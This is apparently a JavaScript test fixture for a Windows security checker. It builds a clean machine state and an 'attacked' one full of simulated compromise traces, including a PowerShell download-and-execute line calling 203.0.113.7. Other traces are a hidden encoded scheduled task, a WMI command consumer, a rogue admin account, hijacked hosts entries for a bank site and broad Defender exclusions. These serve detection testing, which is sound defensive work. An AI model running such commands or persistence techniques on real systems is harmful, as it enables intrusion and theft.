'use strict';
/** Сведения для «Стража» (facts.events, facts.persistence) поверх «хорошего» компьютера из facts.js. */
const { good, NOW } = require('./facts');

const daysAgo = (n) => new Date(NOW - n * 86_400_000).toISOString();
const day = (n) => daysAgo(n).slice(0, 10);

function cleanEvents({ admin = true } = {}) {
  return {
    days: 14, since: daysAgo(14), admin, errors: {},
    security: admin ? { failedTotal: 2, failedTruncated: false, failedByDay: {}, failed: [{ ip: '-', user: 'user', workstation: 'TEST-PC', types: ['3'], count: 2, first: daysAgo(3), last: daysAgo(3) }], remoteLogons: [], cleared: [], usersCreated: [], adminAdds: [] } : null,
    system: { servicesTotal: 1, servicesInstalled: [{ at: daysAgo(5), name: 'Google Updater', path: '"C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.exe" --system', type: 'user mode service', start: 'auto start', account: 'LocalSystem' }], cleared: [] },
    defender: { detections: [], rtpDisabled: [], configChanges: 12 },
    powershell: { suspicious: 3, strong: 0, samples: [] },
  };
}

function cleanPersistence({ admin = true } = {}) {
  return {
    admin, errors: {},
    services: [
      { name: 'GoogleUpdaterService', displayName: 'Google Updater', path: '"C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.exe" --system', file: 'C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.exe', startMode: 'Auto', state: 'Running', account: 'LocalSystem', company: 'Google LLC', signer: null },
      { name: 'ZoomHelper', displayName: 'Zoom Helper', path: 'C:\\Users\\user\\AppData\\Roaming\\Zoom\\bin\\helper.exe', file: 'C:\\Users\\user\\AppData\\Roaming\\Zoom\\bin\\helper.exe', startMode: 'Manual', state: 'Stopped', account: 'LocalSystem', company: 'Zoom', signer: { status: 'Valid', subject: 'Zoom Communications, Inc.' } },
    ],
    tasks: [
      { path: '\\OneDrive Reporting Task', name: 'OneDrive Reporting Task', state: 3, enabled: true, author: 'Microsoft Corporation', actions: [{ exe: '%localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe', args: '/reporting' }], ms: false, company: 'Microsoft Corporation', signer: { status: 'Valid', subject: 'Microsoft Corporation' } },
      { path: '\\GoogleUpdateTaskMachineUA', name: 'GoogleUpdateTaskMachineUA', state: 3, enabled: true, author: '', actions: [{ exe: 'C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe', args: '/ua /installsource scheduler' }], ms: false, company: 'Google LLC', signer: null },
    ],
    tasksHidden: 0,
    wmi: { visible: true, filters: [{ name: 'SCM Event Log Filter', query: 'select * from MSFT_SCMEventLogEvent' }], consumers: [{ name: 'SCM Event Log Consumer', type: 'NTEventLogEventConsumer', command: '' }], bindings: [{ filter: 'SCM Event Log Filter', consumer: 'SCM Event Log Consumer' }] },
    rootCerts: [
      { store: 'LocalMachine', thumbprint: 'CABD2A79A1076A31F21D253635CB039D4329A5E8', subject: 'CN=ISRG Root X1, O=Internet Security Research Group, C=US', issuer: '', notBefore: daysAgo(3000) },
      { store: 'LocalMachine', thumbprint: 'DF3C24F9BFD666761B268073FE06D1CC8D4F82A4', subject: 'CN=DigiCert Global Root G2, OU=www.digicert.com, O=DigiCert Inc, C=US', issuer: '', notBefore: daysAgo(4000) },
      { store: 'CurrentUser', thumbprint: '1111111111111111111111111111111111111111', subject: 'CN=localhost', issuer: '', notBefore: daysAgo(100) },
    ],
    hosts: { total: 1, entries: [{ ip: '127.0.0.1', name: 'kubernetes.docker.internal' }] },
    dns: [{ name: 'Ethernet', description: 'Intel Ethernet', type: 'Ethernet', servers: ['192.168.1.1'] }],
    proxy: { enabled: false, server: '', pac: '', bypass: '', winhttp: '' },
    exclusions: admin ? { visible: true, paths: ['D:\\Games\\Steam'], processes: [], extensions: [] } : { visible: false, paths: [], processes: [], extensions: [] },
  };
}

/** Чистый компьютер с журналами (полная проверка, если admin). */
function clean({ admin = true } = {}) {
  const f = good();
  f.isAdmin = admin;
  f.events = cleanEvents({ admin });
  f.persistence = cleanPersistence({ admin });
  f.physical = { usb: [{ name: 'SanDisk Ultra', serial: 'AA01', first: daysAgo(30), last: daysAgo(2), present: false }] };
  return f;
}

/** Компьютер со следами атаки и закрепления. */
function attacked() {
  const f = clean();
  f.rdp = { deny: 0, nla: 1, port: 3389 };
  const sec = f.events.security;
  sec.failed.push(
    { ip: '203.0.113.7', user: 'administrator', workstation: '', types: ['3'], count: 340, first: daysAgo(6), last: daysAgo(1) },
    { ip: '203.0.113.7', user: 'admin', workstation: '', types: ['3'], count: 60, first: daysAgo(6), last: daysAgo(1) },
    { ip: '198.51.100.20', user: 'user', workstation: '', types: ['10'], count: 12, first: daysAgo(2), last: daysAgo(2) },
    { ip: '192.168.1.50', user: 'user', workstation: 'LAPTOP', types: ['3'], count: 3, first: daysAgo(1), last: daysAgo(1) },
  );
  sec.failedTotal = 417;
  sec.failedByDay = { [day(6)]: 100, [day(3)]: 150, [day(1)]: 167 };
  sec.remoteLogons = [{ at: daysAgo(1), user: 'support', domain: 'TEST-PC', ip: '203.0.113.7', type: 10, workstation: '' }, { at: daysAgo(2), user: 'user', domain: 'TEST-PC', ip: '192.168.1.50', type: 10, workstation: 'LAPTOP' }];
  sec.cleared = [{ at: daysAgo(1), user: 'support' }];
  sec.usersCreated = [{ at: daysAgo(1), user: 'support', sid: 'S-1-5-21-1-2-3-1005', by: 'user' }];
  sec.adminAdds = [{ at: daysAgo(1), member: 'TEST-PC\\support', sid: 'S-1-5-21-1-2-3-1005', group: 'Администраторы', by: 'user' }];
  f.events.system.servicesInstalled.push({ at: daysAgo(1), name: 'WinUpd', path: 'C:\\Users\\Public\\svc.exe', type: 'user mode service', start: 'auto start', account: 'LocalSystem' });
  f.events.defender = {
    detections: [
      { at: daysAgo(2), threat: 'Trojan:Win32/Agent', severity: 'Severe', category: 'Trojan', path: 'file:_C:\\Users\\user\\Downloads\\crack.exe', process: '', user: 'TEST-PC\\user', events: [1117, 1116], actionId: '2', action: 'Quarantine', error: '' },
      { at: daysAgo(1), threat: 'Backdoor:Win32/Bladabindi', severity: 'Severe', category: 'Backdoor', path: 'file:_C:\\ProgramData\\x\\svc.exe', process: '', user: 'NT AUTHORITY\\SYSTEM', events: [1118, 1116], actionId: '2', action: 'Quarantine', error: 'Access denied' },
    ],
    rtpDisabled: [{ at: daysAgo(1) }], configChanges: 40,
  };
  f.events.powershell = { suspicious: 5, strong: 1, samples: [{ at: daysAgo(1), path: '', text: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')" }] };

  const p = f.persistence;
  p.services.push({ name: 'WinUpd', displayName: 'Windows Update Helper', path: 'C:\\Users\\Public\\svc.exe', file: 'C:\\Users\\Public\\svc.exe', startMode: 'Auto', state: 'Running', account: 'LocalSystem', company: '', signer: { status: 'NotSigned', subject: '' } });
  p.tasks.push({ path: '\\Microsoft\\Windows\\Maintenance\\Sync', name: 'Sync', state: 3, enabled: true, author: '', actions: [{ exe: 'powershell.exe', args: '-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AA==' }], ms: true, company: 'Корпорация Майкрософт', signer: null });
  p.tasks.push({ path: '\\Updater', name: 'Updater', state: 3, enabled: true, author: 'user', actions: [{ exe: 'C:\\Users\\user\\AppData\\Local\\upd\\upd.exe', args: '' }], ms: false, company: '', signer: { status: 'NotSigned', subject: '' } });
  p.wmi.consumers.push({ name: 'Updater', type: 'CommandLineEventConsumer', command: 'cmd.exe /c powershell -w hidden -c ...' });
  p.wmi.filters.push({ name: 'Updater', query: "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" });
  p.wmi.bindings.push({ filter: 'Updater', consumer: 'Updater' });
  p.rootCerts.push({ store: 'CurrentUser', thumbprint: '2222222222222222222222222222222222222222', subject: 'CN=Secure Root CA', issuer: '', notBefore: daysAgo(1) });
  p.rootCerts.push({ store: 'LocalMachine', thumbprint: '3333333333333333333333333333333333333333', subject: 'CN=DO_NOT_TRUST_FiddlerRoot, O=DO_NOT_TRUST, OU=Created by http://www.fiddler2.com', issuer: '', notBefore: daysAgo(1) });
  p.hosts.entries.push({ ip: '203.0.113.9', name: 'online.sberbank.ru' }, { ip: '127.0.0.1', name: 'www.kaspersky.ru' }, { ip: '0.0.0.0', name: 'update.microsoft.com' });
  p.dns = [{ name: 'Ethernet', description: 'Intel Ethernet', type: 'Ethernet', servers: ['203.0.113.53'] }];
  p.proxy = { enabled: true, server: '127.0.0.1:8888', pac: '', bypass: '', winhttp: '' };
  p.exclusions = { visible: true, paths: ['C:\\', 'C:\\Users\\user\\AppData\\Local\\Temp', 'D:\\Games\\Steam'], processes: ['powershell.exe'], extensions: ['.exe'] };
  f.accounts.admins.push({ name: 'TEST-PC\\support', sid: 'S-1-5-21-1-2-3-1005', kind: 'User', source: 'Local' });
  f.ports.tcp.push({ proto: 'tcp', addr: '0.0.0.0', port: 4444, pid: 6666, proc: 'svc', services: [] });
  f.boot.secureBoot = 0;
  f.physical.usb.push({ name: 'Kingston DataTraveler', serial: 'BB02', first: daysAgo(1), last: daysAgo(1), present: true });
  return f;
}

module.exports = { clean, attacked, cleanEvents, cleanPersistence, NOW, daysAgo };
